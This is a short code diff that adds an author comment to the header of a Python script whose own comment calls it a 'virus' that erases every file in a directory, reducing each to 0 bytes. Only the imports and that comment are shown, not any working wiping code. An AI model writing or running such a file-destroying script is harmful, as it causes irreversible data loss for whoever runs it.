@@ -1,5 +1,5 @@
 #!/bin/python3
-
+#Author:106_sam
 import os
 
 #This virus is going to erase data from any file present in the directory or Folder#It Corrupts the file and make it into 0 bytes
